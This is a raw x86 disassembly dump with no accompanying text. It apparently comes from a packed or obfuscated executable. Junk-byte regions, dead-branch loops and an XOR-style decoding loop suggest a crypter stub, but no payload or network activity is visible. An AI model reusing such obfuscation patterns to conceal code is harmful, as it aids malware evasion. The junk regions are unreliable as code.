  40321c:	inc    edi
  40321d:	mov    DWORD PTR ds:0x4275a0,edi
  403223:	cmp    DWORD PTR ds:0x4275a0,0x1e
  40322a:	jae    0x40326d
  403230:	cmp    DWORD PTR ds:0x4275a0,0xa
  403237:	jne    0x403248
  40323d:	push   0x444a
  403242:	call   DWORD PTR ds:0x4279cb
  403248:	cmp    DWORD PTR ds:0x4275a0,0x9
  40324f:	jne    0x403262
  403255:	mov    edi,DWORD PTR ds:0x4275a0
  40325b:	inc    edi
  40325c:	mov    DWORD PTR ds:0x4275a0,edi
  403262:	jmp    0x403216
  403267:	or     DWORD PTR ds:0x427d0b,ecx
  40326d:	mov    edi,0xffcd8d62
  403272:	sub    edi,eax
  403274:	add    edi,DWORD PTR [ebp+0x10]
  403277:	or     DWORD PTR ds:0x427d07,0x4292a9
  403281:	xor    edx,ecx
  403283:	jmp    0x403385
  403288:	mov    DWORD PTR [edx-0x34],edi
  40328b:	dec    ebp
  40328c:	jecxz  0x4032fb
  40328e:	popf   
  40328f:	jp     0x40324f
  403291:	sahf   
  403292:	js     0x4032bc
  403294:	shl    cl,1
  403296:	mov    ch,0xe3
  403298:	push   es
  403299:	add    edi,DWORD PTR [esp+edi*2+0x53]
  40329d:	jl     0x40331b
  40329f:	jl     0x403237
  4032a1:	push   0xffffff8a
  4032a3:	in     eax,dx
  4032a4:	xchg   DWORD PTR [ebp+0x33],esp
  4032a7:	lods   eax,DWORD PTR ds:[esi]
  4032a8:	or     BYTE PTR [edx+ecx*2+0x55],dl
  4032ac:	inc    ebx
  4032ad:	test   eax,eax
  4032af:	add    DWORD PTR [ebp-0x25],edx
  4032b2:	test   eax,0x4c4de837
  4032b7:	repz lahf 
  4032b9:	jno    0x4032db
  4032bb:	push   edx
  4032bc:	int3   
  4032bd:	ins    DWORD PTR es:[edi],dx
  4032be:	in     al,0x19
  4032c0:	mov    WORD PTR [ecx+0x75],ss
  4032c3:	mov    al,0x4
  4032c5:	mov    esi,0x9718a3ab
  4032ca:	inc    esp
  4032cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032cc:	test   BYTE PTR [esi+0x27264b11],dh
  4032d2:	shr    DWORD PTR [edx+0x77c327ae],cl
  4032d8:	lods   al,BYTE PTR ds:[esi]
  4032d9:	lds    edx,FWORD PTR [ebp-0x59a7c62d]
  4032df:	xlat   BYTE PTR ds:[ebx]
  4032e0:	sub    DWORD PTR [eax-0x75ba9094],0x89efca27
  4032ea:	cmp    ebp,DWORD PTR [ecx+ebp*2-0x3527f5aa]
  4032f1:	sbb    al,0xcb
  4032f3:	popf   
  4032f4:	addr16 push 0x7a4f83a8
  4032fa:	adc    al,0x51
  4032fc:	mov    ebx,0xce871b64
  403301:	mov    eax,0xe45e484
  403306:	std    
  403307:	mov    gs,esp
  403309:	jmp    DWORD PTR [ecx-0x2ddc0fd4]
  40330f:	sbb    BYTE PTR [esi+ecx*4],0xbd
  403313:	inc    ebx
  403314:	add    DWORD PTR [esi-0x6f],edx
  403317:	stc    
  403318:	sub    al,0xc0
  40331a:	lods   eax,DWORD PTR ds:[esi]
  40331b:	outs   dx,BYTE PTR ds:[esi]
  40331c:	pop    es
  40331d:	(bad)  
  40331e:	fwait
  40331f:	xchg   esp,eax
  403320:	add    eax,0x1bf34d97
  403326:	(bad)  [edi-0x3a159b6b]
  40332c:	mov    esp,0xe7bc2aef
  403331:	mov    edx,0xf5cf62a5
  403336:	shr    BYTE PTR [eax],1
  403338:	ret    
  403339:	fimul  WORD PTR [esi-0x5d]
  40333c:	(bad)
  403340:	push   ebx
  403341:	push   esi
  403342:	cmp    al,0x9c
  403344:	hlt    
  403345:	ret    0x2a51
  403348:	aad    0x70
  40334a:	pusha  
  40334b:	jno    0x4033be
  40334d:	jno    0x4033bc
  40334f:	xor    DWORD PTR [edi-0x6],edx
  403352:	xor    DWORD PTR [eax],0xfffffff7
  403355:	xchg   edx,eax
  403356:	add    DWORD PTR [ecx-0x16232b24],eax
  40335c:	sub    BYTE PTR [eax],dl
  40335e:	loope  0x403330
  403360:	cwde   
  403361:	scas   eax,DWORD PTR es:[edi]
  403362:	jmp    0x450e9bb5
  403367:	test   DWORD PTR [edi],0xf13aca2b
  40336d:	xchg   ebx,eax
  40336e:	sbb    eax,0x5465150b
  403373:	push   es
  403374:	fmulp  st(6),st
  403376:	jmp    0x4f67716d
  40337b:	fcom   QWORD PTR [eax-0x67]
  40337e:	pop    edi
  40337f:	gs gs push ecx
  403382:	cwde   
  403383:	mov    al,ds:0x3bd603d8
  403388:	xlat   BYTE PTR ds:[ebx]
  403389:	mov    DWORD PTR ds:0x4292b5,0x6344
  403393:	ja     0x4034eb
  403399:	push   ebx
  40339a:	jmp    0x4033a4
  40339f:	mov    esi,0x32729e
  4033a4:	mov    eax,DWORD PTR [ebp-0x8]
  4033a7:	mov    edi,DWORD PTR [ebp-0x4]
  4033aa:	xor    edi,ecx
  4033ac:	add    edi,esi
  4033ae:	mov    esi,DWORD PTR [ebp+0x8]
  4033b1:	imul   edi,edx
  4033b4:	mov    ebx,DWORD PTR [ebp+0xc]
  4033b7:	xor    eax,ecx
  4033b9:	add    eax,edx
  4033bb:	mov    al,BYTE PTR [ebx+eax*1+0x32729e]
  4033c2:	mov    BYTE PTR [edi+esi*1],al
  4033c5:	mov    eax,DWORD PTR [ebp-0x4]
  4033c8:	xor    eax,ecx
  4033ca:	lea    edx,[edx+eax*1+0x32729e]
  4033d1:	mov    eax,DWORD PTR [ebp-0x4]
  4033d4:	jmp    0x4034d6
  4033d9:	jnp    0x4033fa
  4033db:	dec    BYTE PTR [eax-0x108252a6]
  4033e1:	pop    esi
  4033e2:	mov    DWORD PTR [edx],ebp
  4033e4:	pop    ebp
  4033e5:	fisubr WORD PTR [ebx]
  4033e7:	inc    edi
  4033e8:	xchg   esi,eax
  4033e9:	jge    0x4033ee
  4033eb:	jl     0x403469
  4033ed:	push   ebx
  4033ee:	jl     0x40346c
  4033f0:	jl     0x40343b
  4033f2:	les    edi,FWORD PTR [edi+0x6be92a8]
  4033f8:	push   ds
  4033f9:	repz mov ecx,0x1624c3e3
  4033ff:	inc    ebp
  403400:	fcomp  QWORD PTR [ebp-0x13]
  403403:	repz pop edi
  403405:	jle    0x403396
  403407:	mov    esp,eax
  403409:	test   DWORD PTR [eax+0x798c0f69],edx
  40340f:	and    cl,BYTE PTR [edi]
  403411:	in     eax,dx
  403412:	cs mov esp,0xfc766663
  403418:	xlat   BYTE PTR ds:[ebx]
  403419:	mov    esi,DWORD PTR [eax+ecx*8-0x20]
  40341d:	lods   eax,DWORD PTR ds:[esi]
  40341e:	mov    BYTE PTR [ecx],bh
  403420:	push   ecx
  403421:	cmp    ebx,DWORD PTR [edx-0x10]
  403424:	or     eax,0x6e3b0313
  403429:	sub    eax,0xf41b0ec3
  40342e:	in     al,0x6c
  403430:	mov    esi,0x9deb0028
  403435:	daa    
  403436:	loope  0x403428
  403438:	inc    esi
  403439:	cmc    
  40343a:	fs icebp 
  40343c:	dec    esp
  40343d:	popa   
  40343e:	push   ebp
  40343f:	aad    0xc9
  403441:	or     al,0xd9
  403443:	xchg   edi,eax
  403444:	mov    gs,WORD PTR [edx]
  403446:	inc    eax
  403447:	and    al,0xe6
  403449:	ficom  DWORD PTR [eax+0x7]
  40344c:	int    0xc0
  40344e:	popf   
  40344f:	int    0xfa
  403451:	js     0x403415
  403453:	(bad)  
  403454:	out    0x49,eax
  403456:	xor    eax,0x3bfd112c
  40345b:	sub    BYTE PTR [edx+0x5d],cl
  40345e:	adc    al,0xa7
  403460:	inc    edx
  403461:	or     DWORD PTR [eax+eax*4+0x20],edx
  403465:	gs xor ecx,esp
  403468:	cmp    eax,DWORD PTR [edx-0x2bb512c1]
  40346e:	iret   
  40346f:	leave  
  403470:	sti    
  403471:	aaa    
  403472:	jl     0x4034b3
  403474:	dec    esp
  403475:	ret    0xa0be
  403478:	sub    esp,edi
  40347a:	mov    esp,0x6970bf7c
  40347f:	jp     0x403407
  403481:	mov    BYTE PTR [ecx+edi*4+0x61e13dcc],al
  403488:	mov    ds,eax
  40348a:	call   0x2745daf2
  40348f:	push   eax
  403490:	add    al,0xa9
  403492:	ds pop eax
  403494:	cwde   
  403495:	outs   dx,DWORD PTR ds:[esi]
  403496:	and    al,0x8c
  403498:	jg     0x403470
  40349a:	aaa    
  40349b:	push   ebx
  40349c:	test   al,0xe4
  40349e:	xchg   BYTE PTR [esi+0x2e9c53b4],cl
  4034a4:	call   0x3a874dd4
  4034a9:	push   eax
  4034aa:	mov    dl,0x99
  4034ac:	xchg   ecx,eax
  4034ad:	adc    eax,0x76c332ac
  4034b2:	mov    ch,0xb2
  4034b4:	jmp    0x8ffc:0xcce86a3d
  4034bb:	ror    ah,cl
  4034bd:	dec    esp
  4034be:	test   BYTE PTR [ebx-0x28],bl
  4034c1:	mov    ebx,0x573f505c
  4034c6:	leave  
  4034c7:	ja     0x403512
  4034c9:	shr    BYTE PTR [ecx+edi*8],0x42
  4034cd:	push   ebx
  4034ce:	sbb    eax,0x810dd86f
  4034d3:	ins    DWORD PTR es:[edi],dx
  4034d4:	jb     0x4034fb
  4034d6:	xor    eax,ecx
  4034d8:	mov    esi,0xffcd8d62
  4034dd:	sub    esi,eax
  4034df:	add    esi,DWORD PTR [ebp+0x10]
  4034e2:	cmp    edx,esi
  4034e4:	jbe    0x40339f
  4034ea:	pop    ebx
  4034eb:	mov    eax,0xf89c8534
  4034f0:	pop    edi
  4034f1:	pop    esi
  4034f2:	leave  
  4034f3:	ret    0xc
  4034f6:	push   ebp
  4034f7:	mov    ebp,esp
  4034f9:	mov    eax,ds:0x409224
  4034fe:	movzx  ecx,BYTE PTR ds:0x4292c1
  403505:	add    DWORD PTR ds:0x4275ac,ecx
  40350b:	mov    edx,0x32729e
  403510:	mov    DWORD PTR ds:0x4292d9,0x1e
  40351a:	cmp    DWORD PTR ds:0x4292d9,0x0
  403521:	je     0x4035b5
  403527:	cmp    DWORD PTR ds:0x4292d9,0x27
  40352e:	jne    0x40353f
  403534:	push   0x1072
  403539:	call   DWORD PTR ds:0x427c43
  40353f:	mov    ecx,DWORD PTR ds:0x4292d9
  403545:	dec    ecx
  403546:	mov    DWORD PTR ds:0x4292d9,ecx
  40354c:	jmp    0x40351a
  403551:	and    DWORD PTR ds:0x4292c5,0x0
  40355b:	xor    ecx,ecx
  40355d:	or     ecx,DWORD PTR ds:0x4292c5
  403563:	inc    ecx
  403564:	mov    DWORD PTR ds:0x4292c5,ecx
  40356a:	cmp    DWORD PTR ds:0x4292c5,0xd
  403571:	jne    0x40358c
  403577:	push   0x42c892
  40357c:	push   0x4275ed
  403581:	push   0x400000
  403586:	call   DWORD PTR ds:0x427a93
  40358c:	cmp    DWORD PTR ds:0x4292c5,0xc
  403593:	jne    0x4035a8
  403599:	xor    ecx,ecx
  40359b:	or     ecx,DWORD PTR ds:0x4292c5
  4035a1:	inc    ecx
  4035a2:	mov    DWORD PTR ds:0x4292c5,ecx
  4035a8:	cmp    DWORD PTR ds:0x4292c5,0x17
  4035af:	jb     0x40355b
  4035b5:	sub    eax,edx
  4035b7:	mov    ecx,DWORD PTR ds:0x42c8ae
  4035bd:	mov    ecx,DWORD PTR [ecx]
  4035bf:	sbb    DWORD PTR ds:0x4275b0,ecx
  4035c5:	mov    ecx,0x7510857
  4035ca:	push   esi
  4035cb:	mov    esi,DWORD PTR [ebp+0xc]
  4035ce:	xor    eax,ecx
  4035d0:	cmp    eax,esi
  4035d2:	je     0x403916
  4035d8:	mov    eax,ds:0x40921c
  4035dd:	mov    esi,DWORD PTR [ebp+0xc]
  4035e0:	sub    eax,edx
  4035e2:	jmp    0x4036e1
  4035e7:	not    DWORD PTR [ebx-0x6c]
  4035ea:	adc    ch,BYTE PTR [eax-0x13]
  4035ed:	lea    ebp,[ebp+0x4f]
  4035f0:	xchg   edi,eax
  4035f1:	xchg   esp,eax
  4035f2:	cwde   
  4035f3:	pushf  
  4035f4:	jecxz  0x4035b2
  4035f6:	cmp    DWORD PTR [eax+0x2],edx
  4035f9:	jl     0x403677
  4035fb:	pop    esi
  4035fc:	jl     0x40367a
  4035fe:	jl     0x4035eb
  403600:	call   0x5eca:0xb038346d
  403607:	rcl    DWORD PTR [ebx],cl
  403609:	shr    DWORD PTR [edx-0x5f],1
  40360c:	in     al,dx
  40360d:	sub    al,BYTE PTR ds:0x5e933bd7
  403613:	inc    ebp
  403614:	xor    ch,dl
  403616:	inc    esp
  403617:	pusha  
  403618:	fst    DWORD PTR [ecx+0x6f]
  40361b:	adc    DWORD PTR [ebx-0x54],ebp
  40361e:	inc    ebx
  40361f:	pop    ss
  403620:	sti    
  403621:	cld    
  403622:	lahf   
  403623:	sbb    eax,edx
  403625:	sti    
  403626:	push   eax
  403627:	fist   WORD PTR [ecx]
  403629:	sahf   
  40362a:	and    ah,al
  40362c:	sbb    al,0x40
  40362e:	loopne 0x4035e7
  403630:	jp     0x403609
  403632:	adc    BYTE PTR [ebx],bh
  403634:	jg     0x403629
  403636:	ins    DWORD PTR es:[edi],dx
  403637:	mov    WORD PTR [eax],gs
  403639:	out    0xdc,al
  40363b:	jle    0x403621
  40363d:	dec    ebx
  40363e:	sub    edi,ebp
  403640:	adc    edx,DWORD PTR [edi]
  403642:	xor    bl,BYTE PTR [edi-0x6a6c2410]
  403648:	pop    edx
  403649:	jb     0x403610
  40364b:	les    esp,FWORD PTR [eax]
  40364d:	xchg   ah,cl
  40364f:	cld    
  403650:	mov    ah,0x68
  403652:	push   edx
  403653:	repz adc DWORD PTR [edx],edx
  403656:	sbb    al,0xe8
  403658:	out    0x11,al
  40365a:	outs   dx,BYTE PTR ds:[esi]
  40365b:	aam    0x44
  40365d:	pop    ds
  40365e:	lods   eax,DWORD PTR ds:[esi]
  40365f:	outs   dx,DWORD PTR ds:[esi]
  403660:	xor    eax,0x1971d737
  403665:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403666:	fsubp  st(6),st
  403668:	lock retf 0xe22a
  40366c:	(bad)  
  40366d:	(bad)  
  40366e:	and    al,0x23
  403670:	pop    esi
  403671:	aas    
  403672:	pop    ebx
  403673:	add    cl,BYTE PTR [edx+0x3c7ecd93]
  403679:	call   0x22f2:0xa97da304
  403680:	mov    ebx,0xd8a613c9
  403685:	imul   esp,eax,0xffffffb6
  403688:	add    BYTE PTR [edx+0x464ebe84],cl
  40368e:	jge    0x4036ef
  403690:	jnp    0x40370e
  403692:	mov    bl,al
  403694:	xchg   esi,eax
  403695:	jae    0x4036af
  403697:	xchg   esp,eax
  403698:	ja     0x403695
  40369a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40369b:	call   0x8aa29eef
  4036a0:	imul   ebp,esi,0x36b18618
  4036a6:	ror    BYTE PTR [ebp+0x54],1
  4036a9:	pop    esp
  4036aa:	pop    DWORD PTR [edi-0xb]
  4036ad:	jp     0x4036e3
  4036af:	pop    ebx
  4036b0:	push   eax
  4036b1:	inc    edx
  4036b2:	sub    ebp,DWORD PTR [edi-0x69]
  4036b5:	outs   dx,DWORD PTR ds:[esi]
  4036b6:	cmp    DWORD PTR [edi],edx
  4036b8:	ins    BYTE PTR es:[edi],dx
  4036b9:	jmp    0xe65b:0x876079f9
  4036c0:	(bad)  
  4036c1:	lock xlat BYTE PTR ds:[ebx]
  4036c3:	push   0xffffff80
  4036c5:	icebp  
  4036c6:	push   0x2014ac76
  4036cb:	adc    eax,0xab3b2d3
  4036d0:	mov    DWORD PTR [ebp+0x1e],ebp
  4036d3:	jmp    0x6ae9cbbe
  4036d8:	inc    DWORD PTR [esi+0x459bb19c]
  4036de:	(bad)  
  4036df:	cmp    ecx,DWORD PTR [ebx]
  4036e1:	xor    eax,ecx
  4036e3:	cmp    eax,esi
  4036e5:	jne    0x4037fa
  4036eb:	mov    eax,ds:0x409224
  4036f0:	add    eax,DWORD PTR ds:0x40921c
  4036f6:	jmp    0x403900
  4036fb:	jmp    0x4037fa
  403700:	xchg   esi,eax
  403701:	xchg   ebx,eax
  403702:	pop    ecx
  403703:	test   BYTE PTR [ebp+0x7a],bl
  403706:	imul   esp,DWORD PTR [ebp-0x47e923f9],0x9888465
  403710:	mov    dl,0x5
  403712:	jl     0x403790
  403714:	pop    esi
  403715:	jl     0x403793
  403717:	jl     0x403790
  403719:	(bad)  
  40371a:	xor    eax,0xecdcbb7a
  40371f:	cwde   
  403720:	and    BYTE PTR [edx+0x51],bl
  403723:	outs   dx,BYTE PTR ds:[esi]
  403724:	cmp    eax,0x541220fc
  403729:	loopne 0x40373d
  40372b:	push   0x71
  40372d:	xor    edx,DWORD PTR [ebx+0x70]
  403730:	test   eax,0xd72ea118
  403735:	pusha  
  403736:	test   edi,0x71d033e0
  40373c:	dec    ebp
  40373d:	sti    
  40373e:	xchg   esp,eax
  40373f:	sbb    DWORD PTR [ebx],edi
  403741:	aam    0x98
  403743:	sbb    edx,DWORD PTR [edx]
  403745:	loopne 0x40379e
  403747:	xor    cl,BYTE PTR [esi-0x24]
  40374a:	cmp    BYTE PTR [edx+0x68822bb5],dh
  403750:	in     al,dx
  403751:	loop   0x403762
  403753:	pop    edx
  403754:	pop    ecx
  403755:	rcr    BYTE PTR [edx],1
  403757:	xor    bh,BYTE PTR [ebx+0x160a1b68]
  40375d:	push   cs
  40375e:	sbb    al,0x33
  403760:	call   0xc241c923
  403765:	je     0x4037d9
  403767:	dec    ebp
  403768:	hlt    
  403769:	js     0x4037b1
  40376b:	inc    esp
  40376c:	sub    BYTE PTR [ebp-0x6c],dl
  40376f:	ja     0x403735
  403771:	test   eax,0xd299ab7a
  403776:	mov    dh,0x87
  403778:	and    eax,0x17a9587e
  40377d:	call   0x1608db6c
  403782:	ret    0x82a4
  403785:	adc    BYTE PTR [ebp+0xd],bl
  403788:	fs int 0x48
  40378b:	add    eax,0x725a09f8
  403790:	into   
  403791:	jle    0x4037e1
  403793:	stos   DWORD PTR es:[edi],eax
  403794:	fwait
  403795:	pop    es
  403796:	mov    ds:0x56be0e1b,eax
  40379b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40379c:	and    eax,0xc21f09ad
  4037a1:	stos   DWORD PTR es:[edi],eax
  4037a2:	rcr    DWORD PTR [eax-0x79],1
  4037a5:	call   0x545f:0x4d5e04f7
  4037ac:	mov    dl,0x6b
  4037ae:	sbb    BYTE PTR [edi+0x7949e80a],ah
  4037b4:	stc    
  4037b5:	(bad)  
  4037b6:	pop    ss
  4037b7:	jns    0x40380f
  4037b9:	mov    ecx,0xe0fa7688
  4037be:	es cli 
  4037c0:	mov    dh,0x71
  4037c2:	imul   esp,DWORD PTR [eax+0x1e76b903],0x521b1062
  4037cc:	lock jnp 0x403848
  4037cf:	sbb    al,0xf0
  4037d1:	and    al,0x45
  4037d3:	addr16 into 
  4037d5:	shl    DWORD PTR [ebx],1
  4037d7:	ins    DWORD PTR es:[edi],dx
  4037d8:	xchg   esp,eax
  4037d9:	jmp    0x501d:0xe367b185
  4037e0:	inc    ecx
  4037e1:	cmp    bh,BYTE PTR [ebx-0x5d]
  4037e4:	sub    eax,0x111e0a8c
  4037e9:	pop    esp
  4037ea:	cli    
  4037eb:	loop   0x403821
  4037ed:	fimul  WORD PTR [ecx-0x42aa66f1]
  4037f3:	ret    0x36e0
  4037f6:	ja     0x403840
  4037f8:	lock and DWORD PTR [ebx-0x516f3bb],ecx
  4037ff:	add    BYTE PTR [eax],al
  403801:	add    BYTE PTR [eax+edi*1],al
  403804:	and    DWORD PTR [ebx-0x5b],0x27bfa7d
  40380b:	jg     0x40385f
  40380d:	and    BYTE PTR [ebx-0x6b300aba],ch
  403813:	add    al,0x7c
  403815:	jl     0x403875
  403817:	jl     0x403895
  403819:	jl     0x403870
  40381b:	jp     0x403885
  40381d:	int    0x82
  40381f:	jae    0x4037fd
  403821:	sbb    ecx,DWORD PTR [ecx-0x4aa2e1fa]
  403827:	lea    ecx,[ecx]
  403829:	and    cl,BYTE PTR [edi+0x6997e5ce]
  40382f:	mov    edx,DWORD PTR [esi+0x66e4d2ec]
  403835:	mov    cl,BYTE PTR [ebx+0x45bebc1a]
  40383b:	clc    
  40383c:	iret   
  40383d:	push   ds
  40383e:	or     eax,0x97123d6e
  403843:	jge    0x40383e
  403845:	popa   
  403846:	pop    ss
  403847:	sbb    al,0x3c
  403849:	scas   al,BYTE PTR es:[edi]
  40384a:	and    eax,0x78e3a1a3
  40384f:	push   0xffffff83
  403851:	add    al,0x96
  403853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403854:	cli    
  403855:	xor    al,0x18
  403857:	fistp  WORD PTR [edi+0x67]
  40385a:	or     edx,ebx
  40385c:	clc    
  40385d:	scas   al,BYTE PTR es:[edi]
  40385e:	inc    ebx
  40385f:	xchg   ecx,eax
  403860:	test   BYTE PTR [edx],bl
  403862:	xor    al,0x69
  403864:	retf   0x8663
  403867:	xchg   ebp,eax
  403868:	es in  eax,0x4e
  40386b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40386c:	pop    ebp
  40386d:	xor    dh,BYTE PTR [esi-0xa5951c4]
  403873:	iret   
  403874:	push   ds
  403875:	push   edi
  403876:	sti    
  403877:	cmp    DWORD PTR [esi-0x1584146d],ecx
  40387d:	sub    al,0x89
  40387f:	pop    ebp
  403880:	inc    esp
  403881:	mov    ebx,0x162f1b1a
  403886:	outs   dx,DWORD PTR ds:[esi]
  403887:	mov    esi,0xf3825bdf
  40388c:	jg     0x403894
  40388e:	(bad)  
  40388f:	int3   
  403890:	cld    
  403891:	add    BYTE PTR [esp+ecx*4+0x16],dl
  403895:	dec    ecx
  403896:	lds    esi,FWORD PTR [ecx+0x7]
  403899:	xchg   BYTE PTR [edi+0x6484e359],cl
  40389f:	sti    
  4038a0:	stos   DWORD PTR es:[edi],eax
  4038a1:	mov    bh,0x83
  4038a3:	dec    edx
  4038a4:	or     al,0xf7
  4038a6:	cmp    al,0xfd
  4038a8:	cmp    DWORD PTR [esi+0x4a],ebx
  4038ab:	pop    edi
  4038ac:	leave  
  4038ad:	ins    BYTE PTR es:[edi],dx
  4038ae:	cmp    BYTE PTR [ebp+0x1b],ah
  4038b1:	adc    al,0xf1
  4038b3:	adc    edx,ecx
  4038b5:	into   
  4038b6:	xlat   BYTE PTR ds:[ebx]
  4038b7:	mov    ecx,0xe155211e
  4038bc:	shl    DWORD PTR [edx+0x516092af],0xa1
  4038c3:	imul   edx,esp,0xedb5ce3a
  4038c9:	scas   al,BYTE PTR es:[edi]
  4038ca:	cs out dx,eax
  4038cc:	inc    ebp
  4038cd:	dec    ebp
  4038ce:	jns    0x403933
  4038d0:	add    eax,0xb04add6b
  4038d5:	in     eax,0x34
  4038d7:	pop    ss
  4038d8:	pop    edx
  4038d9:	clc    
  4038da:	js     0x403875
  4038dc:	mov    edx,0xfb312ea2
  4038e1:	mov    bl,0x71
  4038e3:	cli    
  4038e4:	in     al,dx
  4038e5:	or     ebp,0xcf3172d9
  4038eb:	outs   dx,BYTE PTR ds:[esi]
  4038ec:	cld    
  4038ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038ee:	(bad)  
  4038f0:	scas   eax,DWORD PTR es:[edi]
  4038f1:	xor    al,0x92
  4038f3:	imul   eax,ebx,0xffffffdd
  4038f6:	sbb    BYTE PTR [eax],bl
  4038f8:	stc    
  4038f9:	mov    ecx,0xc133a12a
  4038fe:	add    eax,edx
  403900:	mov    ds:0x40921c,eax
  403905:	mov    eax,DWORD PTR [ebp+0xc]
  403908:	xor    eax,ecx
  40390a:	add    eax,edx
  40390c:	mov    ds:0x409224,eax
  403911:	jmp    0x403920
  403916:	mov    eax,ds:0x409224
  40391b:	mov    ds:0x40921c,eax
  403920:	mov    eax,DWORD PTR [ebp+0x8]
  403923:	mov    eax,DWORD PTR [eax]
  403925:	mov    ecx,DWORD PTR ds:0x40921c
  40392b:	add    DWORD PTR [eax],ecx
  40392d:	pop    esi
  40392e:	pop    ebp
  40392f:	ret    0x8
  403932:	push   ebp
  403933:	mov    ebp,esp
  403935:	sub    esp,0x58
  403938:	mov    DWORD PTR ds:0x42c89e,0x1c
  403942:	cmp    DWORD PTR ds:0x42c89e,0x0
  403949:	je     0x40397e
  40394f:	cmp    DWORD PTR ds:0x42c89e,0x22
  403956:	jne    0x40396b
  40395c:	push   DWORD PTR [ebp-0x14]
  40395f:	push   DWORD PTR [ebp-0x28]
  403962:	push   DWORD PTR [ebp-0x10]
  403965:	call   DWORD PTR ds:0x4278ef
  40396b:	xor    eax,eax
  40396d:	add    eax,DWORD PTR ds:0x42c89e
  403973:	dec    eax
  403974:	mov    ds:0x42c89e,eax
  403979:	jmp    0x403942
  40397e:	mov    ecx,DWORD PTR [ebp+0x8]
  403981:	mov    eax,0x8a42
  403986:	xor    ax,WORD PTR [ecx+0x20]
  40398a:	mov    ecx,0x3b08
  40398f:	add    ax,cx
  403992:	jmp    0x403a97
  403997:	sar    BYTE PTR [edi-0x226ae210],cl
  40399d:	jge    0x403a06
  40399f:	js     0x4039f2
  4039a1:	dec    edi
  4039a2:	mov    esi,0x760a93b0
  4039a7:	test   BYTE PTR [edi],0x7c
  4039aa:	jl     0x403a00
  4039ac:	jl     0x403a2a
  4039ae:	jl     0x4039de
  4039b0:	xor    bh,BYTE PTR [esi+edi*4-0x28e53cca]
  4039b7:	fcmovnb st,st(1)
  4039b9:	xchg   eax,ebp
  4039bb:	rol    DWORD PTR [edx-0x7340bd6],1
  4039c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039c2:	adc    al,0x9d
  4039c4:	das    
  4039c5:	sbb    DWORD PTR [ebx],edi
  4039c7:	jb     0x40395b
  4039c9:	pop    ebp
  4039ca:	mov    ebx,0xc086daeb
  4039cf:	popf   
  4039d0:	rcl    BYTE PTR [esp+esi*1+0x320086cb],0x78
  4039d8:	mov    dl,0x42
  4039da:	or     al,0x4d
  4039dc:	jmp    0x50129955
  4039e1:	or     edx,DWORD PTR [edi*8-0x4ca3071e]
  4039e8:	mov    ?,WORD PTR [esi-0x1bda342f]
  4039ee:	push   esp
  4039ef:	xchg   edx,eax
  4039f0:	fisub  DWORD PTR [edi]
  4039f2:	inc    ebp
  4039f3:	jl     0x403a34
  4039f5:	daa    
  4039f6:	sub    BYTE PTR [edi+0x19],ch
  4039f9:	cmp    dl,BYTE PTR [edx]
  4039fb:	aaa    
  4039fc:	mov    edx,0xde091bc0
  403a01:	rcr    DWORD PTR [ebp+0x711cc09d],cl
  403a07:	inc    eax
  403a08:	pushf  
  403a09:	ja     0x403a42
  403a0b:	adc    esi,DWORD PTR [edx]
  403a0d:	or     cl,bh
  403a0f:	fisubr WORD PTR [eax+0x15c15abf]
  403a15:	in     al,dx
  403a16:	sbb    DWORD PTR [edi-0x340f7691],ecx
  403a1c:	mov    edi,0x454b2187
  403a21:	xor    BYTE PTR [edi-0x3939a514],0xf
  403a28:	sub    eax,0xc5813943
  403a2d:	ja     0x403a75
  403a2f:	nop
  403a30:	jle    0x403a37
  403a32:	and    esi,edx
  403a34:	xor    al,0xe1
  403a36:	arpl   WORD PTR [esi-0x600fe642],si
  403a3c:	dec    eax
  403a3d:	sbb    DWORD PTR [ecx+ecx*2],edx
  403a40:	adc    BYTE PTR [ebx],cl
  403a42:	and    DWORD PTR [edx+0x72a4a6cf],ebx
  403a48:	xchg   edx,eax
  403a49:	mov    edx,0x2174084f
  403a4e:	or     cl,BYTE PTR [esi+edi*4+0x29]
  403a52:	rcl    DWORD PTR [ecx+0x65aeac51],cl
  403a58:	xor    BYTE PTR [ebp+0x3e],bl
  403a5b:	dec    ebx
  403a5c:	into   
  403a5d:	inc    eax
  403a5e:	shr    BYTE PTR [edi+0x14],1
  403a61:	push   ds
  403a62:	call   0xaf2e:0xef14ff2b
  403a69:	pop    edi
  403a6a:	push   ebp
  403a6b:	mov    al,ds:0x876a524d
  403a70:	idiv   BYTE PTR [edx-0x7bf8c62b]
  403a76:	and    DWORD PTR [esi-0x5a],edx
  403a79:	dec    edi
  403a7a:	(bad)  
  403a7c:	xchg   ebx,eax
  403a7d:	mov    eax,0xe0ef68de
  403a82:	inc    ebp
  403a83:	out    0xfb,eax
  403a85:	mov    ds:0xfe47a5d7,eax
  403a8a:	xchg   ebp,eax
  403a8b:	je     0x403a80
  403a8d:	call   0x170ad158
  403a92:	enter  0x6198,0x4d
  403a96:	dec    ebp
  403a97:	movzx  eax,ax
  403a9a:	xor    ecx,ecx
  403a9c:	xor    ecx,DWORD PTR ds:0x427db0
  403aa2:	mov    ecx,DWORD PTR [ecx]
  403aa4:	or     DWORD PTR ds:0x42c88a,ecx
  403aaa:	mov    DWORD PTR [ebp-0xc],eax
  403aad:	adc    DWORD PTR ds:0x42c882,ecx
  403ab3:	mov    BYTE PTR [ebp-0x1],0x7f
  403ab7:	not    ecx
  403ab9:	lea    eax,[ebp-0x1]
  403abc:	xor    DWORD PTR ds:0x42c88a,0x4292b9
  403ac6:	mov    DWORD PTR [ebp-0x10],eax
  403ac9:	mov    DWORD PTR ds:0x427d0f,0x12
  403ad3:	cmp    DWORD PTR ds:0x427d0f,0x0
  403ada:	je     0x403b2a
  403ae0:	cmp    DWORD PTR ds:0x427d0f,0x8
  403ae7:	jne    0x403af6
  403aed:	push   DWORD PTR [ebp-0xc]
  403af0:	call   DWORD PTR ds:0x4279cf
  403af6:	cmp    DWORD PTR ds:0x427d0f,0x9
  403afd:	jne    0x403b12
  403b03:	xor    ecx,ecx
  403b05:	xor    ecx,DWORD PTR ds:0x427d0f
  403b0b:	dec    ecx
  403b0c:	mov    DWORD PTR ds:0x427d0f,ecx
